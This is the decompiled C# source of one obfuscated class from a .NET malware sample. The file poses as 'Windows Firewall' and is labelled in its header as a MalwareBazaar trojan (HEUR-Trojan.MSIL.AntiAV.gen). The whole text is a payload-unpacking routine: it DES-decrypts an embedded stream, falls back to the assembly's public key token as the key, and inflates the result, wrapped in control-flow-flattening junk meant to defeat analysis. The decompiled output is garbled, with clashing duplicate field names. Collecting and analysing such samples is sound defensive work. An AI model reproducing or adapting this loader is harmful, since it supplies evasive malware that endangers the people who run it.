// Decompiled with JetBrains decompiler
// Type: WindowsFirewall.IconType
// Assembly: Windows Firewall, Version=12.5.2.3, Culture=neutral, PublicKeyToken=null
// MVID: B2F50818-876B-4F01-AE88-291FA22C03A1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan.MSIL.AntiAV.gen-0a7f9a4a2ff6257feb79223e3432cef859eda0b8e5738450449fd016eb059f70.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;

namespace WindowsFirewall
{
  internal class IconType
  {
    private static readonly object currentColor;
    private static readonly int currentColor;
    private static readonly int generatorPosition;
    private static readonly MemoryStream currentColor = (MemoryStream) null;
    private static readonly MemoryStream generatorPosition = (MemoryStream) null;
    private static readonly byte currentColor;

    static IconType()
    {
      IconType.currentColor = int.MaxValue;
      IconType.generatorPosition = int.MinValue;
      IconType.currentColor = BitmapTable.SelectToolbox(0);
      IconType.generatorPosition = BitmapTable.SelectToolbox(0);
      IconType.currentColor = EmulatorAttribute.SelectToolbox();
    }

    private static string SelectToolbox(Assembly currentColor)
    {
      string currentColor1 = MenuItemDictionary.SelectToolbox((object) currentColor);
      int nextData = FormDesigner.SelectToolbox((object) currentColor1, ',');
      if (nextData >= 0)
      {
label_1:
        switch (4)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (IconType.SelectToolbox);
            }
            currentColor1 = ProcessProvider.SelectToolbox((object) currentColor1, 0, nextData);
            break;
        }
      }
      return currentColor1;
    }

    private static byte[] SelectToolbox(Assembly currentColor)
    {
      try
      {
        string currentColor1 = MenuItemDictionary.SelectToolbox((object) currentColor);
        int num = ControlConverter.SelectToolbox((object) currentColor1, "PublicKeyToken=");
        if (num < 0)
        {
label_1:
          switch (3)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (IconType.SelectToolbox);
              }
              num = ControlConverter.SelectToolbox((object) currentColor1, "publickeytoken=");
              break;
          }
        }
        if (num < 0)
        {
label_6:
          switch (2)
          {
            case 0:
              goto label_6;
            default:
              return (byte[]) null;
          }
        }
        else
        {
          int generatorPosition = num + 15;
          if (ProjectTree.SelectToolbox((object) currentColor1, generatorPosition) != 'n')
          {
label_9:
            switch (4)
            {
              case 0:
                goto label_9;
              default:
                if (ProjectTree.SelectToolbox((object) currentColor1, generatorPosition) == 'N')
                {
label_11:
                  switch (7)
                  {
                    case 0:
                      goto label_11;
                  }
                }
                else
                {
                  byte[] currentColor2 = FunctionDictionary.SelectToolbox(DatabaseContext.SelectToolbox(ProcessProvider.SelectToolbox((object) currentColor1, generatorPosition, 16), NumberStyles.HexNumber));
                  FileSite.SelectToolbox((Array) currentColor2);
                  return currentColor2;
                }
                break;
            }
          }
          return (byte[]) null;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] SelectToolbox(Stream currentColor)
    {
      object currentColor1;
      EditorQueue.SelectToolbox(currentColor1 = IconType.currentColor);
      try
      {
        return IconType.IncreaseConnection(97L, currentColor);
      }
      finally
      {
        ConditionOptions.SelectToolbox(currentColor1);
      }
    }

    internal static byte[] SelectToolbox(long currentColor, Stream generatorPosition)
    {
      try
      {
        return IconType.SelectToolbox(generatorPosition);
      }
      catch (HostProtectionException ex)
      {
        return IconType.IncreaseConnection(97L, generatorPosition);
      }
    }

    internal static byte[] IncreaseConnection(long currentColor, Stream generatorPosition)
    {
      Stream currentColor1 = generatorPosition;
      MemoryStream currentColor2 = (MemoryStream) null;
      ushort num1 = ~(ushort) DeviceSettings.SelectToolbox((object) generatorPosition);
      for (int index = 1; index < 3; ++index)
        DeviceSettings.SelectToolbox((object) generatorPosition);
label_3:
      switch (7)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (IconType.IncreaseConnection);
          }
          if (((int) num1 & 2) != 0)
          {
label_7:
            switch (2)
            {
              case 0:
                goto label_7;
              default:
                DESCryptoServiceProvider currentColor3 = StoreStream.SelectToolbox();
                byte[] generatorPosition1 = new byte[8];
                PluginDictionary.SelectToolbox((object) generatorPosition, generatorPosition1, 0, 8);
                BookmarkTree.SelectToolbox((object) currentColor3, generatorPosition1);
                byte[] generatorPosition2 = new byte[8];
                PluginDictionary.SelectToolbox((object) generatorPosition, generatorPosition2, 0, 8);
                bool flag = true;
                foreach (byte num2 in generatorPosition2)
                {
                  if (num2 != (byte) 0)
                  {
label_10:
                    switch (2)
                    {
                      case 0:
                        goto label_10;
                      default:
                        flag = false;
                        goto label_15;
                    }
                  }
                }
label_14:
                switch (3)
                {
                  case 0:
                    goto label_14;
                }
label_15:
                if (flag)
                {
label_16:
                  switch (5)
                  {
                    case 0:
                      goto label_16;
                    default:
                      generatorPosition2 = IconType.SelectToolbox(AspectContext.SelectToolbox());
                      break;
                  }
                }
                PathFactory.SelectToolbox((object) currentColor3, generatorPosition2);
                if (IconType.currentColor == null)
                {
label_19:
                  switch (1)
                  {
                    case 0:
                      goto label_19;
                    default:
                      if (IconType.currentColor == int.MaxValue)
                      {
label_21:
                        switch (5)
                        {
                          case 0:
                            goto label_21;
                          default:
                            ToolbarTree.SelectToolbox((object) IconType.currentColor, (int) Method.SelectToolbox((object) generatorPosition));
                            break;
                        }
                      }
                      else
                      {
                        ToolbarTree.SelectToolbox((object) IconType.currentColor, IconType.currentColor);
                        break;
                      }
                      break;
                  }
                }
                ProjectTable.SelectToolbox((object) IconType.currentColor, 0L);
                ICryptoTransform currentColor4 = NetworkTable.SelectToolbox((object) currentColor3);
                int messageHandle1 = ViewType.SelectToolbox((object) currentColor4);
                DirectoryStream.SelectToolbox((object) currentColor4);
                byte[] numArray = new byte[DirectoryStream.SelectToolbox((object) currentColor4)];
                byte[] generatorPosition3 = new byte[ViewType.SelectToolbox((object) currentColor4)];
                int num3;
                for (num3 = (int) ViewAttribute.SelectToolbox((object) generatorPosition); (long) (num3 + messageHandle1) < Method.SelectToolbox((object) generatorPosition); num3 += messageHandle1)
                {
                  PluginDictionary.SelectToolbox((object) generatorPosition, generatorPosition3, 0, messageHandle1);
                  int messageHandle2 = Solution.SelectToolbox((object) currentColor4, generatorPosition3, 0, messageHandle1, numArray, 0);
                  ControlOptions.SelectToolbox((object) IconType.currentColor, numArray, 0, messageHandle2);
                }
label_27:
                switch (4)
                {
                  case 0:
                    goto label_27;
                  default:
                    PluginDictionary.SelectToolbox((object) generatorPosition, generatorPosition3, 0, (int) (Method.SelectToolbox((object) generatorPosition) - (long) num3));
                    byte[] generatorPosition4 = ImageLoader.SelectToolbox((object) currentColor4, generatorPosition3, 0, (int) (Method.SelectToolbox((object) generatorPosition) - (long) num3));
                    ControlOptions.SelectToolbox((object) IconType.currentColor, generatorPosition4, 0, generatorPosition4.Length);
                    currentColor1 = (Stream) IconType.currentColor;
                    ProjectTable.SelectToolbox((object) currentColor1, 0L);
                    currentColor2 = IconType.currentColor;
                    break;
                }
                break;
            }
          }
          if (((int) num1 & 8) != 0)
          {
label_30:
            switch (1)
            {
              case 0:
                goto label_30;
              default:
                try
                {
                  if (IconType.generatorPosition == null)
                  {
label_32:
                    switch (5)
                    {
                      case 0:
                        goto label_32;
                      default:
                        if (IconType.generatorPosition == int.MinValue)
                        {
label_34:
                          switch (3)
                          {
                            case 0:
                              goto label_34;
                            default:
                              ToolbarTree.SelectToolbox((object) IconType.generatorPosition, (int) Method.SelectToolbox((object) currentColor1) * 2);
                              break;
                          }
                        }
                        else
                        {
                          ToolbarTree.SelectToolbox((object) IconType.generatorPosition, IconType.generatorPosition);
                          break;
                        }
                        break;
                    }
                  }
                  ProjectTable.SelectToolbox((object) IconType.generatorPosition, 0L);
                  DeflateStream currentColor5 = SelectionStack.SelectToolbox(currentColor1, CompressionMode.Decompress);
                  int messageHandle3 = 1000;
                  byte[] generatorPosition5 = new byte[messageHandle3];
                  int messageHandle4;
                  do
                  {
                    messageHandle4 = PluginDictionary.SelectToolbox((object) currentColor5, generatorPosition5, 0, messageHandle3);
                    if (messageHandle4 > 0)
                    {
label_39:
                      switch (3)
                      {
                        case 0:
                          goto label_39;
                        default:
                          ControlOptions.SelectToolbox((object) IconType.generatorPosition, generatorPosition5, 0, messageHandle4);
                          break;
                      }
                    }
                  }
                  while (messageHandle4 >= messageHandle3);
label_42:
                  switch (1)
                  {
                    case 0:
                      goto label_42;
                    default:
                      currentColor2 = IconType.generatorPosition;
                      break;
                  }
                }
                catch (Exception ex)
                {
                  break;
                }
                break;
            }
          }
          if (currentColor2 != null)
          {
label_46:
            switch (4)
            {
              case 0:
                goto label_46;
              default:
                return BookmarkInvoker.SelectToolbox((object) currentColor2);
            }
          }
          else
          {
            byte[] generatorPosition6 = new byte[Method.SelectToolbox((object) generatorPosition) - ViewAttribute.SelectToolbox((object) generatorPosition)];
            PluginDictionary.SelectToolbox((object) generatorPosition, generatorPosition6, 0, generatorPosition6.Length);
            return generatorPosition6;
          }
      }
    }
  }
}
